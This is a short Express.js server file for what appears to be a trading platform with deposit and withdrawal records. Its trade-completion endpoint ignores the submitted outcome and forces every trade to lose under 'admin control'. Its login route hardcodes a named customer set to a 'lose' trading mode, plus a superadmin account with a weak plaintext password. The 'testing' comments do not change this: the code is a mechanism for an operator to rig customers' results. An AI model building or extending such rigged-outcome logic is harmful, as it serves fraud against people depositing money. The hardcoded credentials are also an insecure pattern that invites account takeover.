// Ultra-minimal server for Railway deployment
const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3005;

// Minimal middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Health check - ultra fast
app.get('/api/health', (req, res) => {
  res.status(200).send('OK');
});

// Serve static files
app.use(express.static(path.join(__dirname, 'dist/public')));

// Create minimal data files if they don't exist
const ensureDataFiles = () => {
  const files = [
    ['pending-data.json', '{"deposits":[],"withdrawals":[]}'],
    ['admin-data.json', '[]'],
    ['users-data.json', '[]'],
    ['trades-data.json', '[]'],
    ['transactions-data.json', '[]']
  ];
  
  files.forEach(([name, content]) => {
    if (!fs.existsSync(name)) {
      fs.writeFileSync(name, content);
    }
  });
};

// Basic auth endpoint
app.post('/api/auth/user/login', (req, res) => {
  const { username, password } = req.body;
  
  // Simple auth for testing
  if (username === 'angela.soenoko' && password === 'password123') {
    res.json({
      success: true,
      user: {
        id: 'user-angela-1758195715',
        username: 'angela.soenoko',
        balance: 10000,
        trading_mode: 'lose'
      },
      token: 'test-token'
    });
  } else if (username === 'superadmin' && password === 'superadmin123') {
    res.json({
      success: true,
      user: {
        id: 'superadmin',
        username: 'superadmin',
        role: 'superadmin'
      },
      token: 'admin-token'
    });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

// Basic trade completion endpoint
app.post('/api/trades/complete', (req, res) => {
  const { tradeId, outcome } = req.body;
  
  // Simple trade control - always lose for testing
  const finalOutcome = false; // Force lose
  
  res.json({
    success: true,
    tradeId,
    originalOutcome: outcome,
    finalOutcome,
    overrideApplied: true,
    message: 'Trade completed with admin control'
  });
});

// Catch all route - serve index.html
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist/public/index.html'));
});

// Initialize and start server
ensureDataFiles();

const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 SIMPLE SERVER READY - Port ${PORT}`);
}).on('error', (err) => {
  console.error('❌ Error:', err.message);
  process.exit(1);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});
